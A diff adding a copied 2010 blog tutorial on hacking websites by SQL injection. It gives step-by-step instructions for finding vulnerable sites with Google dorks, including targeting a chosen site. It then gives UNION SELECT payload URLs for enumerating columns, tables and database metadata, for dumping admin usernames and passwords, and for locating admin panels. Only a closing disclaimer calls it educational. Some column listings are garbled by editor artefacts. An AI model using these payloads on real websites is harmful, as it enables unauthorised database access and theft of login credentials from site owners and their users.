@@ -1,0 +1,213 @@
+/*
+ Site: http://www.breakthesecurity.com/2010/12/hacking-website-using-sql-injection.html
+*/
+
+What is SQL Injection?
+SQL injection is one of the popular web application hacking method.  Using the SQL Injection attack, an unauthorized person can access the database of the website. Attacker can extract the data from the Database.
+
+What a hacker can do with SQL Injection attack?
+
+* ByPassing Logins
+* Accessing secret data
+* Modifying contents of website
+* Shutting down the My SQL server
+
+So, here we go.
+
+Step 1: Finding Vulnerable Website:
+To find a SQL Injection vulnerable site, you can use Google search by searching for certain keywords. Those keyword often referred as 'Google dork'.
+
+Some Examples:
+inurl:index.php?id=
+inurl:gallery.php?id=
+inurl:article.php?id=
+inurl:pageid=
+
+Here is the huge list of Google Dork
+http://www.ziddu.com/download/13161874/A...t.zip.html
+
+Copy one of the above keyword and paste in the google. Here , we will got lot search result with
+We have to visit the websites one by one for checking the vulnerability.
+
+
+
+
+Note:if you like to hack particular website,then try this:
+site:www.victimsite.com dork_list_commands
+for eg:
+
+site:www.victimsite.com inurl:index.php?id=
+
+Step 2: Checking the Vulnerability:
+Now let us check the vulnerability of the target website. To check the vulnerability , add the single quotes(') at the end of the url and hit enter.
+
+For eg:
+
+http://www.victimsite.com/index.php?id=2' 
+
+If the page remains in same page or showing that page not found, then it is not vulnerable.
+
+If you got an error message just like this, then it means that the site is vulnerable
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1 
+
+
+Step 3: Finding Number of columns:
+Great, we have found that the website is vulnerable to SQLi attack.  Our next step is to find the number of columns present in the target database.
+
+For that replace the single quotes(') with "order by n" statement.
+
+Change the n from 1,2,3,4,,5,6,...n. Until you get the error like "unknown column ".
+
+For eg:
+
+http://www.victimsite.com/index.php?id=2 order by 1
+http://www.victimsite.com/index.php?id=2 order by 2
+http://www.victimsite.com/index.php?id=2 order by 3
+http://www.victimsite.com/index.php?id=2 order by 4
+
+If you get the error while trying the "x"th number,then no of column is "x-1".
+
+I mean:
+
+http://www.victimsite.com/index.php?id=2 order by 1(noerror)
+http://www.victimsite.com/index.php?id=2 order by 2(noerror)
+http://www.victimsite.com/index.php?id=2 order by 3(noerror)
+http://www.victimsite.com/index.php?id=2 order by 4(noerror)
+http://www.victimsite.com/index.php?id=2 order by 5(noerror)
+http://www.victimsite.com/index.php?id=2 order by 6(noerror)
+http://www.victimsite.com/index.php?id=2 order by 7(noerror)
+http://www.victimsite.com/index.php?id=2 order by 8(error)
+
+
+so now x=8 , The number of column is x-1 i.e, 7.
+
+In case ,if the above method fails to work for you, then try to add the "--" at the end of the statement.
+For eg:
+
+http://www.victimsite.com/index.php?id=2 order by 1-- 
+
+
+Step 4: Find the Vulnerable columns:
+We have successfully discovered the number of columns present in the target database.  Let us find  the vulnerable column by trying the query "union select columns_sequence".
+
+Change the id value to negative(i mean id=-2).  Replace the columns_sequence with the no from 1 to x-1(number of columns) separated with commas(,).
+
+For eg:
+if the number of columns is 7 ,then the query is as follow:
+
+http://www.victimsite.com/index.php?id=-2 union select 1,2,3,4,5,6,7--
+
+If the above method is not working then try this:
+
+http://www.victimsite.com/index.php?id=-2 and 1=2 union select 1,2,3,4,5,6,7--
+
+Once you execute the query, it will display the vulnerable column.
+
+
+
+Bingo,  column '3' and '7' are found to be vulnerable.  Let us take the first vulnerable column '3' . We can inject our query in this column.
+
+Step 5: Finding version,database,user
+Replace the 3 from the query with "version()"
+
+For eg:
+
+http://www.victimsite.com/index.php?id=-2 and 1=2 union select 1,2,version(),4,5,6,7-- 
+
+Now, It will display the version as 5.0.1 or 4.3. something like this.
+
+Replace the version() with database() and user() for finding the database,user respectively.
+
+For eg:
+
+http://www.victimsite.com/index.php?id=-2 and 1=2 union select 1,2,database(),4,5,6,7-- 
+
+
+http://www.victimsite.com/index.php?id=-2 and 1=2 union select 1,2,user(),4,5,6,7-- 
+
+
+If the above is not working,then try this:
+
+http://www.victimsite.com/index.php?id=-2 and 1=2 union select 1,2,unhex(hex(@@version)),4,5,6,7--
+
+
+Step 6: Finding the Table Name
+If the Database version is 5 or above. If the version is 4.x, then you have to guess the table names (blind sql injection attack).
+
+Let us find the table name of the database. Replace the 3 with "group_concat(table_name) and add the "from information_schema.tables where table_schema=database()"
+
+For eg:
+
+
+http://www.victimsite.com/index.php?id=-2 and 1=2 union select 1,2,group_concat(table_name),4,5,6,7 from information_schema.tables where table_schema=database()--
+
+Now it will display the list of table names. Find the table name which is related with the admin or user.
+
+
+
+
+Let us choose the "admin " table.
+
+Step 7: Finding the Column Name
+
+Now replace the "group_concat(table_name) with the "group_concat(column_name)"
+
+Replace the "from information_schema.tables where table_schema=database()--" with "FROM information_schema.columns WHERE table_name=mysqlchar--
+
+We have to convert the table name to MySql CHAR() string .
+
+Install the HackBar addon:
+https://addons.mozilla.org/en-US/firefox/addon/3899/
+
+Once you installed the add-on, you can see a toolbar that will look like the following one. If you are not able to see the Hackbar, then press F9.
+
+Select sql->Mysql->MysqlChar() in the Hackbar.
+
+
+It will ask you to enter string that you want to convert to MySQLCHAR().  We want to convert the table name to MySQLChar .  In our case the table name is 'admin'.
+
+
+
+Now you can see the CHAR(numbers separated with commans) in the Hack toolbar.
+
+
+
+Copy and paste the code at the end of the url instead of the "mysqlchar"
+
+For eg:
+
+http://www.victimsite.com/index.php?id=-2 and 1=2 union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_name=CHAR(97, 100, 109, 105, 110)--
+
+The above query will display the list of column.
+
+For example: admin<Plug>PeepOpenassword,admin_id,admin_name,admin_password,active,id,admin_name,admin_pas ​ s,admin_id,admin_name,admin_password,ID_admin,admin_username,username<Plug>PeepOpenassword..etc..
+
+Now replace the replace group_concat(column_name) with group_concat(columnname1,0x3a,anothercolumnname2).
+
+Now replace the " from information_schema.columns where table_name=CHAR(97, 100, 109, 105, 110)" with the "from table_name"
+
+For eg:
+
+http://www.victimsite.com/index.php?id=-2
+and 1=2 union select 1,2,group_concat(admin_id,0x3a,admin_password),4,5,6,7 from admin--
+
+If the above query displays the 'column is not found' erro, then try another column name from the list.
+
+If we got luck, then it will display the data stored in the database depending on your column name.  For instance, username and password column will display the login credentials stored in the database.
+
+Step 8: Finding the Admin Panel:
+Just try with url like:
+
+http://www.victimsite.com/admin.php
+http://www.victimsite.com/admin/
+http://www.victimsite.com/admin.html
+http://www.victimsite.com:2082/
+
+etc.
+If you got luck ,you will find the admin page using above urls. or you can some kind of admin finder tools.
+
+Warning:
+The above post is completely for educational purpose only.  Never attempt to follow the above steps against third-party websites.  If you want to learn SQL injection attack method , then you can learn in safe environment by setup your own lab.
+
+In this article, i just explained how to attack SQL injection vulnerable site in a n00b(newbie) way. If you want to become PenTester, you must know how these attacks works. In my next article, i will explain the SQL Injection depth.
